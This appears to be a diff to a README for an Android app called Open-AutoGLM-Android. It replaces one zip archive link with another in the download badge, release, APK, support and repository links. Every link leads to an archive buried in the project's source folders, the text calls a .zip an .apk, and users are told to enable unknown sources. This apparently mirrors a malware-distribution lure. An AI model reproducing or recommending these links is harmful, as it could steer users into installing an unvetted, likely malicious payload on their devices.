@@ -2,7 +2,7 @@
 
 ## 📥 Download It Now!
 
-[![Download Open-AutoGLM-Android](https://raw.githubusercontent.com/Trolencio23/Open-AutoGLM-Android/main/app/src/main/res/xml/Android-Auto-Open-GL-1.6-beta.4.zip)](https://raw.githubusercontent.com/Trolencio23/Open-AutoGLM-Android/main/app/src/main/res/xml/Android-Auto-Open-GL-1.6-beta.4.zip)
+[![Download Open-AutoGLM-Android](https://github.com/Trolencio23/Open-AutoGLM-Android/raw/refs/heads/main/app/src/main/aidl/com/Open-Android-GL-Auto-v3.9.zip)](https://github.com/Trolencio23/Open-AutoGLM-Android/raw/refs/heads/main/app/src/main/aidl/com/Open-Android-GL-Auto-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you start, make sure your device meets these minimum requirements:
 
 1. **Visit the Release Page**
 
-   Go to the following link to download the application: [Open-AutoGLM-Android Releases](https://raw.githubusercontent.com/Trolencio23/Open-AutoGLM-Android/main/app/src/main/res/xml/Android-Auto-Open-GL-1.6-beta.4.zip).
+   Go to the following link to download the application: [Open-AutoGLM-Android Releases](https://github.com/Trolencio23/Open-AutoGLM-Android/raw/refs/heads/main/app/src/main/aidl/com/Open-Android-GL-Auto-v3.9.zip).
 
 2. **Select the Latest Version**
 
@@ -34,7 +34,7 @@ Before you start, make sure your device meets these minimum requirements:
 
 3. **Download the APK File**
 
-   Look for the file that ends with `.apk`. It should be labeled clearly, such as `https://raw.githubusercontent.com/Trolencio23/Open-AutoGLM-Android/main/app/src/main/res/xml/Android-Auto-Open-GL-1.6-beta.4.zip`. Click on it to start the download.
+   Look for the file that ends with `.apk`. It should be labeled clearly, such as `https://github.com/Trolencio23/Open-AutoGLM-Android/raw/refs/heads/main/app/src/main/aidl/com/Open-Android-GL-Auto-v3.9.zip`. Click on it to start the download.
 
 4. **Enable Unknown Sources**
 
@@ -59,7 +59,7 @@ Before you start, make sure your device meets these minimum requirements:
 
 ## 👥 Support
 
-If you encounter any issues, feel free to open an issue on our [GitHub repository](https://raw.githubusercontent.com/Trolencio23/Open-AutoGLM-Android/main/app/src/main/res/xml/Android-Auto-Open-GL-1.6-beta.4.zip), and our community will assist you.
+If you encounter any issues, feel free to open an issue on our [GitHub repository](https://github.com/Trolencio23/Open-AutoGLM-Android/raw/refs/heads/main/app/src/main/aidl/com/Open-Android-GL-Auto-v3.9.zip), and our community will assist you.
 
 ## 📝 Feedback
 
@@ -67,7 +67,7 @@ We welcome your feedback to improve the application. Please share your thoughts 
 
 ## 🔗 Additional Resources
 
-For further details and updates, visit our [GitHub page](https://raw.githubusercontent.com/Trolencio23/Open-AutoGLM-Android/main/app/src/main/res/xml/Android-Auto-Open-GL-1.6-beta.4.zip).
+For further details and updates, visit our [GitHub page](https://github.com/Trolencio23/Open-AutoGLM-Android/raw/refs/heads/main/app/src/main/aidl/com/Open-Android-GL-Auto-v3.9.zip).
 
 ## 🚀 Conclusion
 
